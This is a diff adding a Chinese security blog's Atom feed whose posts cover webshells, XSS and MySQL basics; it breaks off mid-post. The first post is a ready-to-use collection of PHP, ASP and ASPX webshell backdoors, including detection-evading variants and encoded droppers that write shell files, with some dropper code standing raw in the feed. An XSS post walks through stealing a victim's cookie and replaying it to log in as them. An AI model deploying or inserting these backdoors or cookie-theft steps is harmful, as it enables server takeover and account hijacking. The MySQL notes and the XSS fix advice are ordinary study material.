@@ -1,0 +1,529 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Rakitic-Fans</title>
+  
+  
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://yoursite.com/"/>
+  <updated>2019-08-09T14:59:20.850Z</updated>
+  <id>http://yoursite.com/</id>
+  
+  <author>
+    <name>Zhairui</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>一句话木马源代码</title>
+    <link href="http://yoursite.com/2019/08/09/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%BA%90%E4%BB%A3%E7%A0%81/"/>
+    <id>http://yoursite.com/2019/08/09/一句话木马源代码/</id>
+    <published>2019-08-09T14:48:14.700Z</published>
+    <updated>2019-08-09T14:59:20.850Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="PHP一句话："><a href="#PHP一句话：" class="headerlink" title="PHP一句话："></a>PHP一句话：</h1><h6 id="1、普通一句话："><a href="#1、普通一句话：" class="headerlink" title="1、普通一句话："></a>1、普通一句话：</h6><p><code>&lt;?php</code></p><p><code>@eval($_POST[123456]);</code></p><p><code>?&gt;</code></p><p>*post后面中括号里面的内容是使用菜刀或蚁剑连接时的密码</p><h6 id="2、防爆破一句话："><a href="#2、防爆破一句话：" class="headerlink" title="2、防爆破一句话："></a>2、防爆破一句话：</h6><p><code>&lt;?php</code></p><p><code>substr(md5($_REQUEST[&#39;x&#39;]),28)==&#39;6862&#39;&amp;&amp;eval($_REQUEST[&#39;password&#39;]);</code></p><p><code>?&gt;</code></p><p>*菜刀地址<a href="http://192.168.64.137/x.php?x=myh0st" target="_blank" rel="noopener">http://192.168.64.137/x.php?x=myh0st</a></p><h6 id="3、过狗一句话"><a href="#3、过狗一句话" class="headerlink" title="3、过狗一句话:"></a>3、过狗一句话:</h6><p><code>&lt;?php</code></p><p><code>($_=@$_GET[s]).@$_($_POST[hihack])</code></p><p><code>?&gt;</code>      //菜刀地址 <a href="http://localhost/1.php?s=assert" target="_blank" rel="noopener">http://localhost/1.php?s=assert</a></p><p><code>&lt;php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[hihack]);</code></p><p><code>?&gt;</code></p><h6 id="4、404隐藏的一句话："><a href="#4、404隐藏的一句话：" class="headerlink" title="4、404隐藏的一句话："></a>4、404隐藏的一句话：</h6><p>​    <code>&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</code><br>​        <code>&lt;html&gt;&lt;head&gt;</code><br>​        <code>&lt;title&gt;404 Not Found&lt;/title&gt;</code><br>​        <code>&lt;/head&gt;&lt;body&gt;</code><br>​        <code>&lt;h1&gt;Not Found&lt;/h1&gt;</code><br>​        <code>&lt;p&gt;</code>The requested URL /error.php was not found on this server.        <code>&lt;/p&gt;</code><br>​        <code>&lt;/body&gt;&lt;/html&gt;</code><br>​        <code>&lt;?php</code><br>​            <code>@preg_replace(&quot;/[checksql]/e&quot;,$_POST[&#39;hihack&#39;],&quot;saft&quot;);</code><br>​        <code>?&gt;</code></p><p>​    菜刀连接时在配置栏添加：</p><p>​    <code>&lt;O&gt;date=@eval($_POST[paxmac]);&lt;/O&gt;</code></p><h6 id="5、不用问号-的一句话："><a href="#5、不用问号-的一句话：" class="headerlink" title="5、不用问号(?)的一句话："></a>5、不用问号(?)的一句话：</h6><p><code>&lt;script language=&quot;php&quot;&gt;eval ($_POST[hihack]);&lt;/script&gt;</code></p><h6 id="6、躲避检测："><a href="#6、躲避检测：" class="headerlink" title="6、躲避检测："></a>6、躲避检测：</h6><p><code>&lt;?php assert($_REQUEST[&quot;hihack&quot;]);?&gt;</code></p><h6 id="7、变形一句话后门："><a href="#7、变形一句话后门：" class="headerlink" title="7、变形一句话后门："></a>7、变形一句话后门：</h6><?php fputs (fopen(pack("H*","6c6f7374776f6c662e706870"),"w"),pack("H*","3c3f406576616c28245f504f53545b6c6f7374776f6c665d293f3e"))?><?php @fputs(fopen(base64_decode('bXloMHN0LnBocA=='),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydoaWhhY2snXSk7Pz4='));?><p>访问该网页，然后菜刀连接：/myh0st.php  密码：hihack</p><h1 id="ASP一句话："><a href="#ASP一句话：" class="headerlink" title="ASP一句话："></a>ASP一句话：</h1><h6 id="1、普通一句话：-1"><a href="#1、普通一句话：-1" class="headerlink" title="1、普通一句话："></a>1、普通一句话：</h6><p><code>&lt;%eval request(&quot;hihack&quot;)%&gt;</code>或<code>&lt;%execute(request(&quot;hihack&quot;))%&gt;</code></p><h6 id="2、unicode编码的access木马-："><a href="#2、unicode编码的access木马-：" class="headerlink" title="2、unicode编码的access木马 ："></a>2、unicode编码的access木马 ：</h6><p>向access数据库插入 ┼攠數畣整爠煥敵瑳∨≡┩&gt;   编码前：<code>&lt;% execute request(&quot;a&quot;)%&gt;</code></p><p>然后备份出webshell，密码a</p><h6 id="3、配置文件插马（需要条件支持，插入的数据被写在了配置文件中）："><a href="#3、配置文件插马（需要条件支持，插入的数据被写在了配置文件中）：" class="headerlink" title="3、配置文件插马（需要条件支持，插入的数据被写在了配置文件中）："></a>3、配置文件插马（需要条件支持，插入的数据被写在了配置文件中）：</h6><p>插入：<code>&quot;%&gt;&lt;% bbbb=request(&quot;aaaa&quot;)%&gt;&lt;%eval(bbbb)%&gt;&lt;%&#39;</code>        </p><p>访问报错，获取到配置文件的地址，然后连接，密码aaaa</p><h6 id="4、不用-的一句话："><a href="#4、不用-的一句话：" class="headerlink" title="4、不用%的一句话："></a>4、不用%的一句话：</h6><p><code>&lt;script language=VBScript runat=server&gt;execute request(&quot;hihack&quot;)&lt;/script&gt;</code></p><h6 id="5、不用双引号-“-的一句话："><a href="#5、不用双引号-“-的一句话：" class="headerlink" title="5、不用双引号(“)的一句话："></a>5、不用双引号(“)的一句话：</h6><p><code>&lt;%eval request(chr(35))%&gt;</code>        密码：#</p><h1 id="ASPX一句话："><a href="#ASPX一句话：" class="headerlink" title="ASPX一句话："></a>ASPX一句话：</h1><h6 id="1、普通一句话：-2"><a href="#1、普通一句话：-2" class="headerlink" title="1、普通一句话："></a>1、普通一句话：</h6><p>​    &lt;%@ Page Language=”Jscript”%&gt;       &lt;%eval(Request.Item[“hihack”],”unsafe”);%&gt;</p><h6 id="2、免杀一句话："><a href="#2、免杀一句话：" class="headerlink" title="2、免杀一句话："></a>2、免杀一句话：</h6><p>&lt;%@PAGE LANGUAGE=JSCRIPT%&gt;&lt;%var PAY:String=Request[“\x61\x62\x63\x64”];eval(PAY,”\x75\x6E\x73\x61”+”\x66\x65”);%&gt; </p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;PHP一句话：&quot;&gt;&lt;a href=&quot;#PHP一句话：&quot; class=&quot;headerlink&quot; title=&quot;PHP一句话：&quot;&gt;&lt;/a&gt;PHP一句话：&lt;/h1&gt;&lt;h6 id=&quot;1、普通一句话：&quot;&gt;&lt;a href=&quot;#1、普通一句话：&quot; class=&quot;headerli
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="文件上传漏洞" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>MySQL特殊数据库</title>
+    <link href="http://yoursite.com/2019/08/09/Mysql%E7%89%B9%E6%AE%8A%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
+    <id>http://yoursite.com/2019/08/09/Mysql特殊数据库/</id>
+    <published>2019-08-09T14:48:08.621Z</published>
+    <updated>2019-08-09T14:58:56.311Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="information-schema简介："><a href="#information-schema简介：" class="headerlink" title="information_schema简介："></a>information_schema简介：</h1><p>在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。</p><h1 id="information-schema数据库表说明"><a href="#information-schema数据库表说明" class="headerlink" title="information_schema数据库表说明:"></a>information_schema数据库表说明:</h1><h6 id="SCHEMATA表："><a href="#SCHEMATA表：" class="headerlink" title="SCHEMATA表："></a>SCHEMATA表：</h6><p>提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</p><h6 id="TABLES表："><a href="#TABLES表：" class="headerlink" title="TABLES表："></a>TABLES表：</h6><p>提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。</p><h6 id="COLUMNS表："><a href="#COLUMNS表：" class="headerlink" title="COLUMNS表："></a>COLUMNS表：</h6><p>提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</p><h6 id="STATISTICS表："><a href="#STATISTICS表：" class="headerlink" title="STATISTICS表："></a>STATISTICS表：</h6><p>提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。</p><h6 id="USER-PRIVILEGES表："><a href="#USER-PRIVILEGES表：" class="headerlink" title="USER_PRIVILEGES表："></a>USER_PRIVILEGES表：</h6><p>给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</p><h6 id="SCHEMA-PRIVILEGES表："><a href="#SCHEMA-PRIVILEGES表：" class="headerlink" title="SCHEMA_PRIVILEGES表："></a>SCHEMA_PRIVILEGES表：</h6><p>给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。</p><h6 id="TABLE-PRIVILEGES表："><a href="#TABLE-PRIVILEGES表：" class="headerlink" title="TABLE_PRIVILEGES表："></a>TABLE_PRIVILEGES表：</h6><p>给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。</p><h6 id="COLUMN-PRIVILEGES表："><a href="#COLUMN-PRIVILEGES表：" class="headerlink" title="COLUMN_PRIVILEGES表："></a>COLUMN_PRIVILEGES表：</h6><p>给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。</p><h6 id="CHARACTER-SETS表："><a href="#CHARACTER-SETS表：" class="headerlink" title="CHARACTER_SETS表："></a>CHARACTER_SETS表：</h6><p>提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。</p><h6 id="COLLATIONS表："><a href="#COLLATIONS表：" class="headerlink" title="COLLATIONS表："></a>COLLATIONS表：</h6><p>提供了关于各字符集的对照信息。</p><h6 id="COLLATION-CHARACTER-SET-APPLICABILITY表："><a href="#COLLATION-CHARACTER-SET-APPLICABILITY表：" class="headerlink" title="COLLATION_CHARACTER_SET_APPLICABILITY表："></a>COLLATION_CHARACTER_SET_APPLICABILITY表：</h6><p>指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。</p><h6 id="TABLE-CONSTRAINTS表："><a href="#TABLE-CONSTRAINTS表：" class="headerlink" title="TABLE_CONSTRAINTS表："></a>TABLE_CONSTRAINTS表：</h6><p>描述了存在约束的表。以及表的约束类型。</p><h6 id="KEY-COLUMN-USAGE表："><a href="#KEY-COLUMN-USAGE表：" class="headerlink" title="KEY_COLUMN_USAGE表："></a>KEY_COLUMN_USAGE表：</h6><p>描述了具有约束的键列。</p><h6 id="ROUTINES表："><a href="#ROUTINES表：" class="headerlink" title="ROUTINES表："></a>ROUTINES表：</h6><p>提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。</p><h6 id="VIEWS表："><a href="#VIEWS表：" class="headerlink" title="VIEWS表："></a>VIEWS表：</h6><p>给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。</p><h6 id="TRIGGERS表："><a href="#TRIGGERS表：" class="headerlink" title="TRIGGERS表："></a>TRIGGERS表：</h6><p>提供了关于触发程序的信息。必须有super权限才能查看该表</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;information-schema简介：&quot;&gt;&lt;a href=&quot;#information-schema简介：&quot; class=&quot;headerlink&quot; title=&quot;information_schema简介：&quot;&gt;&lt;/a&gt;information_schema简介：&lt;/
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="数据库基础" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>MySQL基础命令</title>
+    <link href="http://yoursite.com/2019/08/09/MySQL%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
+    <id>http://yoursite.com/2019/08/09/MySQL基本命令/</id>
+    <published>2019-08-09T14:48:08.617Z</published>
+    <updated>2019-08-09T14:58:53.035Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="MySql数据库操作基础"><a href="#MySql数据库操作基础" class="headerlink" title="MySql数据库操作基础"></a>MySql数据库操作基础</h1><p><code>#启动mysql服务器</code><br>：net start mysql</p><p><code>#关闭musql服务器</code>：net stop mysql</p><p><code>#显示数据库</code><br>：show databases；</p><p><code>#创建数据库</code><br>:create database test;</p><p><code>#删除数据库:</code> drop database test;</p><p><code>#使用该数据库</code><br>:use test;</p><p><code>#显示数据库中的表</code><br>:show tables;</p><p><code>#创建表</code>:</p><p>​    create table student(</p><p>​    id int auto_increment primary key,</p><p>​    name varchar(50),</p><p>​    sex varchar(20),</p><p>​    date varchar(50),</p><p>​    content varchar(10),</p><p>​    )default charset=utf8;</p><p><code>#删除表</code><br>:drop table student;</p><p><code>#查看表的结构</code><br>:describe student;  可以简写为desc student;</p><p><code>#插入数据</code></p><p>​    insert into student values(null,’aa’,’男’,’1988-10-2’,’……’);</p><p>​    insert into student values(null,’bb’,’女’,’1889-03-6’,’……’);</p><p>​    insert into student values(null,’cc’,’男’,’1889-08-8’,’……’);</p><p>​    insert into student values(null,’dd’,’女’,’1889-12-8’,’……’);</p><p>​    insert into student values(null,’ee’,’女’,’1889-09-6’,’……’);</p><p>​    insert into student values(null,’ff’,’null’,’1889-09-6’,’……’);</p><p><code>#查询表中的数据</code><br>:select * from student;<br>select id,name from student;</p><p><code>#修改某一条数据</code>: update student set sex=’男’ where id=4;</p><p><code>#删除数据</code><br>:delete from student where id=5;</p><p><code>#and 且</code>:</p><p>​    select * from student where date&gt;’1988’ and date&lt;’1995’;</p><p><code>#or 或</code>:</p><p>​    select * from student where date&lt;’1988’ or date&gt;’1995’;</p><p><code>#between</code>:</p><p>​    select * from student where date between ‘1988’ and ‘1995’;</p><p><code>#in 查询制定集合内的数据</code><br>:</p><p>​    select * from student where id in (1,3,5);</p><p><code>#排序 :升序(asc)和降序(desc)</code>：</p><p>​     select * from student order by id asc;</p><p><code>#分组查询 #聚合函数</code>:</p><p>​     select max(id),name,sex from student group by sex;</p><p>​    select min(date) from student;</p><p>​    select avg(id) as ‘求平均’ from student;</p><p>​    select count(*) from student;   #统计表中总数</p><p>​    select count(sex) from student;   #统计表中性别总数 </p><p>​    select sum(id) from student;  #id的和</p><p><code>#查询第i条以后到第j条的数据(不包括第i条)</code>:</p><p>​    select * from student limit 2,5;  #显示3-5条数据</p><p><code>#修改数据</code><br>:</p><p>​    update c set age=66 where id=2;</p><p>​    update c set name=’花花’,age=21,sex=’女’ where id=2<br>delete from c where age=21;</p><p><code>#常用查询语句</code>:</p><p>​    select name,age ,id from c</p><p>​    select * from c where age&gt;40 and age&lt;60;  #and</p><p>​    select * from c where age&lt;40 or age&lt;60;  #or</p><p>​    select * from c where age between 40 and 60 ;#between</p><p>​    select * from c where age in (30,48);   #in 查询指定集合内的数据</p><p>​    select * from c order by age desc;      #order by （升序,降序）</p><p><code>#分组查询</code><br>:</p><p>​    select name,max(age) from c group by sex;  #按性别查最大年龄</p><p><code>#聚合函数</code><br>:</p><p>​    select min(age) from c;</p><p>​    select avg(age) as ‘平均年龄 ‘ from c;</p><p>​    select count(*) from c;  #统计表中数据总数</p><p>​    select sum(age) from c;</p><p><code>#修改表的名字</code><br>:</p><p>​    alter table tbl_name rename to new_name</p><p>​    alter table c rename to a;</p><p><code>#表结构修改</code><br>:</p><p>​    create table test<br>(</p><p>​    id int not null auto_increment primary key, #设定主键</p><p>​    name varchar(20) not null default ‘NoName’, #设定默认值</p><p>​    department_id int not null,</p><p>​    position_id int not null,</p><p>​    unique (department_id,position_id) #设定唯一值</p><p>​    );</p><p><code>#向表中增加一个字段(列)</code><br>:</p><p>​    alter table tablename add columnname type;</p><p>​    alter table tablename add(columnname type);</p><p>​    alter table test add  columnname varchar(20);</p><p><code>#修改表中某个字段的名字</code><br>:</p><p>​    alter table tablename change columnname newcolumnname type;</p><p>​    alter table test change name uname varchar(50);</p><p><code>#表position 增加列</code>:</p><p>​    test<br>alter table position add(test char(10));</p><p><code>#表position 修改列test</code><br>:</p><p>​    alter table position modify test char(20) not null;</p><p><code>#表position 修改列test默认值</code>:</p><p>​    alter table position alter test set default ‘system’;</p><p><code>#表position 去掉test 默认值</code><br>:</p><p>​    alter table position alter test drop default;</p><p><code>#表position 去掉列test</code><br>:</p><p>​    alter table position drop column test;</p><p><code>#表depart_pos 删除主键</code><br>:</p><p>​    alter table depart_pos drop primary key;</p><p><code>#表depart_pos 增加主键</code><br>:</p><p>​    alter table depart_pos add primary key PK_depart_pos<br>(department_id,position_id);</p><p><code>#用文本方式将数据装入数据库表中</code>:</p><p>​    load data local infile “D:/mysql.txt” into table MYTABLE;</p><p><code>#导入.sql文件</code>:</p><p>​    source d:/mysql.sql;  #或者  /. d:/mysql.sql;</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;MySql数据库操作基础&quot;&gt;&lt;a href=&quot;#MySql数据库操作基础&quot; class=&quot;headerlink&quot; title=&quot;MySql数据库操作基础&quot;&gt;&lt;/a&gt;MySql数据库操作基础&lt;/h1&gt;&lt;p&gt;&lt;code&gt;#启动mysql服务器&lt;/code&gt;&lt;br&gt;：n
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="数据库基础" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>XSS应用</title>
+    <link href="http://yoursite.com/2019/08/09/XSS%E5%BA%94%E7%94%A8/"/>
+    <id>http://yoursite.com/2019/08/09/XSS应用/</id>
+    <published>2019-08-09T14:48:02.736Z</published>
+    <updated>2019-08-09T14:59:14.600Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="搭建在线平台："><a href="#搭建在线平台：" class="headerlink" title="搭建在线平台："></a>搭建在线平台：</h1><p>网址：<a href="https://xsshs.cn/xss.php" target="_blank" rel="noopener">https://xsshs.cn/xss.php</a></p><p>注册并登录……</p><h1 id="生成项目："><a href="#生成项目：" class="headerlink" title="生成项目："></a>生成项目：</h1><h6 id="1、创建项目："><a href="#1、创建项目：" class="headerlink" title="1、创建项目："></a>1、创建项目：</h6><p>登陆成功后，在主界面点击找到我的项目，并点击创建</p><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564815155306.png" alt="1564815155306"></p><h6 id="2、设置项目名称和描述："><a href="#2、设置项目名称和描述：" class="headerlink" title="2、设置项目名称和描述："></a>2、设置项目名称和描述：</h6><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564815200020.png" alt="1564815200020"></p><h6 id="3、选择模块"><a href="#3、选择模块" class="headerlink" title="3、选择模块:"></a>3、选择模块:</h6><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564815274358.png" alt="1564815274358"></p><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564815349065.png" alt="1564815349065"></p><h6 id="4、选择攻击代码并点击完成："><a href="#4、选择攻击代码并点击完成：" class="headerlink" title="4、选择攻击代码并点击完成："></a>4、选择攻击代码并点击完成：</h6><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564815404447.png" alt="1564815404447"></p><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564815466281.png" alt="1564815466281"></p><h1 id="攻击目标网站："><a href="#攻击目标网站：" class="headerlink" title="攻击目标网站："></a>攻击目标网站：</h1><h6 id="1、将上面复制的攻击代码粘贴到输入框，并提交"><a href="#1、将上面复制的攻击代码粘贴到输入框，并提交" class="headerlink" title="1、将上面复制的攻击代码粘贴到输入框，并提交"></a>1、将上面复制的攻击代码粘贴到输入框，并提交</h6><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564816203325.png" alt="1564816203325"></p><h6 id="2、查看创建的项目，发现有一条新的内容"><a href="#2、查看创建的项目，发现有一条新的内容" class="headerlink" title="2、查看创建的项目，发现有一条新的内容"></a>2、查看创建的项目，发现有一条新的内容</h6><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564816284194.png" alt="1564816284194"></p><h6 id="3、点击展开，查看有用信息"><a href="#3、点击展开，查看有用信息" class="headerlink" title="3、点击展开，查看有用信息"></a>3、点击展开，查看有用信息</h6><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564816339305.png" alt="1564816339305"></p><p>这里已经拿到了cookie</p><h1 id="通过cookie登录网站："><a href="#通过cookie登录网站：" class="headerlink" title="通过cookie登录网站："></a>通过cookie登录网站：</h1><h6 id="1、利用burp对登陆页面进行抓包"><a href="#1、利用burp对登陆页面进行抓包" class="headerlink" title="1、利用burp对登陆页面进行抓包"></a>1、利用burp对登陆页面进行抓包</h6><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564816519524.png" alt="1564816519524"></p><h6 id="2、将盗取到的cookie替换包内的cookie"><a href="#2、将盗取到的cookie替换包内的cookie" class="headerlink" title="2、将盗取到的cookie替换包内的cookie"></a>2、将盗取到的cookie替换包内的cookie</h6><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564816602751.png" alt="1564816602751"></p><h6 id="3、放包，登陆成功"><a href="#3、放包，登陆成功" class="headerlink" title="3、放包，登陆成功"></a>3、放包，登陆成功</h6>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;搭建在线平台：&quot;&gt;&lt;a href=&quot;#搭建在线平台：&quot; class=&quot;headerlink&quot; title=&quot;搭建在线平台：&quot;&gt;&lt;/a&gt;搭建在线平台：&lt;/h1&gt;&lt;p&gt;网址：&lt;a href=&quot;https://xsshs.cn/xss.php&quot; target=&quot;_bla
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>XSS进阶</title>
+    <link href="http://yoursite.com/2019/08/09/XSS%E8%BF%9B%E9%98%B6/"/>
+    <id>http://yoursite.com/2019/08/09/XSS进阶/</id>
+    <published>2019-08-09T14:48:02.721Z</published>
+    <updated>2019-08-09T14:59:17.975Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="XSS常见测试语句："><a href="#XSS常见测试语句：" class="headerlink" title="XSS常见测试语句："></a>XSS常见测试语句：</h1><p><code>&lt;scrip&gt;alert(/xss/)&lt;/scrip&gt;</code></p><p><code>&lt;img src=x onerror=alert(/xss/)&gt;</code></p><p><code>&lt;svg onload=alert(xss/)&gt;</code></p><p><code>&lt;a href=javascript:alert(/xss/)&gt;</code></p><h1 id="常见编码方式："><a href="#常见编码方式：" class="headerlink" title="常见编码方式："></a>常见编码方式：</h1><h3 id="1、JS编码："><a href="#1、JS编码：" class="headerlink" title="1、JS编码："></a>1、JS编码：</h3><p>JS提供了四种字符编码的策略，</p><p>三个八进制数字，如果个数不够，在前面补0，列如:”e”的编码为“\145”.</p><p>两个十六进制数字，如果个数不够，在前面补0，列如“e”的编码为“\x65”.</p><p>四个十六进制数字，如果个数不够，在前面补0，列如“e”的编码为“\u0065”</p><p>对于一些控制字‘符，使用特殊的C类型的转义风格（例如\n和\r）</p><h3 id="2、HTML-实体编码："><a href="#2、HTML-实体编码：" class="headerlink" title="2、HTML 实体编码："></a>2、HTML 实体编码：</h3><p>命名实体：以&amp;开头，以分号结尾的，列如“&lt;”的编码是“&amp;lt“.</p><p>字符编码：十进制，十六进制ASCII码或Unicode字符编码，样式为“&amp;#数值；“，</p><p>列如“&lt;“ 可以编码为”&#060;“和 ”&amp;#x3c；“</p><h3 id="3、URL-编码"><a href="#3、URL-编码" class="headerlink" title="3、URL 编码"></a>3、URL 编码</h3><p>这里的URL编码，也是两次URL全编码的结果。如果alert被过滤，</p><p>结果为:<code>%25%36%31%25%36%43%25%36%35%25%37%32%25%37%34</code></p><p>在使用XSS编码测试时，需要考虑HTML渲染的顺序，特别是针对多种编码组合时，要选择合适的编码方式进行测试。</p><h1 id="XSS漏洞修复建议"><a href="#XSS漏洞修复建议" class="headerlink" title="XSS漏洞修复建议"></a>XSS漏洞修复建议</h1><p>因为XSS漏洞涉及输入和输出两部分，所以其修复也分为两种。</p><p>过滤输入的数据，包括<code>““” “&lt;“ “&gt;” “on”</code>等非法字符。</p><p>对输出到页面的数据进行相应的编码转换，包括HTML实体编码，JavaScript 编码等。</p><h3 id="参考：https-www-freebuf-com-articles-web-153055-html"><a href="#参考：https-www-freebuf-com-articles-web-153055-html" class="headerlink" title="参考：https://www.freebuf.com/articles/web/153055.html"></a>参考：<a href="https://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/153055.html</a></h3><h3 id="在线生成js代码网站-https-xsshs-cn-xss-php"><a href="#在线生成js代码网站-https-xsshs-cn-xss-php" class="headerlink" title="在线生成js代码网站:https://xsshs.cn/xss.php"></a>在线生成js代码网站:<a href="https://xsshs.cn/xss.php" target="_blank" rel="noopener">https://xsshs.cn/xss.php</a></h3>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;XSS常见测试语句：&quot;&gt;&lt;a href=&quot;#XSS常见测试语句：&quot; class=&quot;headerlink&quot; title=&quot;XSS常见测试语句：&quot;&gt;&lt;/a&gt;XSS常见测试语句：&lt;/h1&gt;&lt;p&gt;&lt;code&gt;&amp;lt;scrip&amp;gt;alert(/xss/)&amp;lt;/sc
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>XSS基础知识</title>
+    <link href="http://yoursite.com/2019/08/09/XSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
+    <id>http://yoursite.com/2019/08/09/XSS基础知识/</id>
+    <published>2019-08-09T14:48:02.711Z</published>
+    <updated>2019-08-09T14:59:11.215Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="XSS概念："><a href="#XSS概念：" class="headerlink" title="XSS概念："></a>XSS概念：</h1><p>XSS(Cross Site Script)名为跨站脚本攻击，为了与层叠样式表CSS区分，将跨站脚本简写为XSS，主要危害是盗取用户信息，钓鱼，制造蠕虫等。</p><p>黑客通过HTML注入篡改了网页，插入了恶意脚本，从而在用户浏览网页时，实现控制用户浏览器行为的一种攻击方式。</p><p>黑客可以利用XSS盗取用户cookie，有了用户的cookie，可以使用用户的身份来正常访问站点。</p><p>XSS属于客户端代码注入，通常注入代码是JavaScript，区别于命令注入，SQL注入属于服务端代码注入。</p><h1 id="判断是否存在XSS："><a href="#判断是否存在XSS：" class="headerlink" title="判断是否存在XSS："></a>判断是否存在XSS：</h1><p>可以通过输入构造的JavaScript代码，看页面是否能够弹出构造的弹窗。</p><p>例：<script>alert(123)</script></p><p>​        <image src onerror="alert('123')"></image></p><p>​       </p><h1 id="XSS分类："><a href="#XSS分类：" class="headerlink" title="XSS分类："></a>XSS分类：</h1><p>XSS根据效果的不同，可以分为反射型XSS，存储型XSS。DOM型XSS</p><h3 id="1、反射型XSS："><a href="#1、反射型XSS：" class="headerlink" title="1、反射型XSS："></a>1、反射型XSS：</h3><p>反射型XSS又称为非持久性XSS。</p><p>攻击方式：攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。</p><p><img src="https://img-blog.csdn.net/20180731102922765?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2V4dHJlbWViaW5nbw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p><p><img 